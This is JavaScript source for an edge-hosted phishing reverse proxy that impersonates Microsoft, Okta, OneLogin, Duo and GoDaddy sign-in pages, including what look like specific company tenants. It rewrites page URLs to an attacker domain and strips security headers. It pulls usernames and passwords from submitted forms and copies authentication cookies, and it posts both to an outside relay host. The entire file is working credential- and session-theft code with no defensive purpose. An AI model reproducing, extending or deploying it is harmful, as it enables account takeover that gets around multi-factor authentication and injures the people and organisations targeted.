export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'proxyapp.ddns.net'; // Change to your domain
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
};

const AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap', 'ESTSSC', 'ESTSAUTHLIGHT', 'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice'],
  okta: ['sid', 'vid', 'authtoken', 'oktaStateToken', 'DT', 'tnt'],
  onelogin: ['sub_session_onelogin', 'onelogin', 'sub'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token']
};

const CREDENTIAL_PATTERNS = {
  microsoft: {
    username: ['login', 'UserName', 'username', 'email', 'account', 'DomainUser', 'loginfmt', 'i0116'],
    password: ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD', 'i0118']
  },
  okta: {
    username: ['username', 'user', 'email', 'identifier', 'login', 'i0116'],
    password: ['password', 'pass', 'pwd', 'credentials[passcode]', 'answer', 'credentials[password]']
  },
  onelogin: {
    username: ['username', 'email', 'login', 'user'],
    password: ['password', 'pwd', 'pass']
  },
  duo: {
    username: ['username', 'email', 'user'],
    password: ['passcode', 'answer', 'password'],
    device: ['device', 'phone_number']
  },
  godaddy: {
    username: ['username', 'email', 'login', 'name', 'account'],
    password: ['password', 'pwd', 'pass', 'credential']
  }
};
// =======================================================================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookiesFile(cookieText, ip, platform = 'unknown', url = '') {
  try {
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${url}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

// Get upstream from path or use default
function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    
    const provider = IDENTITY_PROVIDERS[upstreamDomain];
    
    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }
  
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

// CRITICAL FIX: Clean query string by removing routing artifacts (path=_p&path=...)
function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');
  
  // If we have multiple 'path' parameters or 'path' starts with '_p', it's Zeabur routing artifacts
  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    // Remove all 'path' parameters, keep others
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') {
        cleaned.append(key, value);
      }
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }
  
  // If single 'path' param that looks legitimate (not URL segments), keep it
  // But if it looks like a domain or path segment, remove it
  if (pathValues.length === 1) {
    const val = pathValues[0];
    // If it contains dots (domain) or equals '_p', it's likely an artifact
    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
      const cleaned = new URLSearchParams();
      for (const [key, value] of params) {
        if (key !== 'path') cleaned.append(key, value);
      }
      const result = cleaned.toString();
      return result ? '?' + result : '';
    }
  }
  
  return search;
}

function rewriteUrls(text, upstreamDomain) {
  let result = text;
  
  // Remove localhost references
  result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
  result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
  
  // Rewrite all known domains to proxy paths
  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
    const escaped = domain.replace(/\./g, '\\.');
    
    result = result.replace(
      new RegExp(`https://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    result = result.replace(
      new RegExp(`http://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    result = result.replace(
      new RegExp(`//${escaped}(?!\\w)`, 'g'),
      `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
  });
  
  // Handle relative paths
  result = result.replace(
    /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
    `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
  );
  
  // Fix JS hostname references
  result = result.replace(
    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
    `window.location.hostname = "${YOUR_DOMAIN}"`
  );
  result = result.replace(
    /document\.domain\s*=\s*["'][^"']+["']/g,
    `document.domain = "${YOUR_DOMAIN}"`
  );
  
  return result;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    
    const shouldProxy = IDENTITY_PROVIDERS[url.hostname] || 
                       url.hostname.includes('microsoft') || 
                       url.hostname.includes('live.com') || 
                       url.hostname.includes('office.com') ||
                       url.hostname.includes('msauth.net');
    
    if (shouldProxy) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
    }
    
    return location;
  } catch (e) {
    return location;
  }
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
  
  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }
  
  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  
  // CRITICAL FIX: Clean the query string to remove Zeabur routing artifacts
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  
  console.log(`[${info.type}] ${request.method} ${YOUR_DOMAIN}${url.pathname} -> ${upstreamUrl}`);
  
  // Prepare headers
  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.set('Referer', `https://${upstreamDomain}/`);
  headers.set('Origin', `https://${upstreamDomain}`);
  
  // Harvest credentials on POST
  if (request.method === 'POST') {
    try {
      const clone = request.clone();
      const ct = clone.headers.get('content-type') || '';
      let data = {};
      
      if (ct.includes('json')) {
        data = await clone.json();
      } else {
        const body = await clone.text();
        const params = new URLSearchParams(body);
        params.forEach((v, k) => data[k] = v);
      }
      
      const patterns = CREDENTIAL_PATTERNS[info.type] || CREDENTIAL_PATTERNS.microsoft;
      const creds = { ip, platform: info.type, upstream: upstreamDomain, url: request.url };
      let found = false;
      
      for (const [key, val] of Object.entries(data)) {
        if (!val) continue;
        const low = key.toLowerCase();
        
        if (patterns.username.some(p => low.includes(p.toLowerCase()))) {
          creds.username = val;
          found = true;
        }
        if (patterns.password.some(p => low.includes(p.toLowerCase()))) {
          creds.password = val;
          found = true;
        }
      }
      
      if (found && creds.username) {
        await sendToVercel('credentials', creds);
      }
    } catch (e) {
      console.error('Harvest error:', e);
    }
  }
  
  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };
    
    if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOpts.body = request.body;
      fetchOpts.duplex = 'half';
    }
    
    const resp = await fetch(upstreamUrl, fetchOpts);
    
    // Handle redirect
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const newHeaders = new Headers(resp.headers);
        const newLoc = rewriteLocation(loc);
        
        console.log(`[Redirect] ${loc} -> ${newLoc}`);
        
        newHeaders.set('Location', newLoc);
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }
    
    // Process response
    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    
    // Process cookies
    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let cookieStr = '';
    
    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      
      const patterns = AUTH_COOKIES[info.type] || [];
      const hasAuth = patterns.some(p => p === '.*' || cookieStr.toLowerCase().includes(p.toLowerCase()));
      
      if (hasAuth || cookieStr) {
        await exfiltrateCookiesFile(cookieStr, ip, info.type, request.url);
      }
      
      cookies.forEach(c => {
        const mod = c.replace(/Domain=[^;]+;?/gi, '');
        newHeaders.append('Set-Cookie', mod);
      });
    }
    
    // Rewrite body content
    const ct = resp.headers.get('content-type') || '';
    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
      let text = await resp.text();
      text = rewriteUrls(text, upstreamDomain);
      
      return new Response(text, { status: resp.status, headers: newHeaders });
    }
    
    return new Response(resp.body, { status: resp.status, headers: newHeaders });
    
  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message,
      upstream: upstreamDomain
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
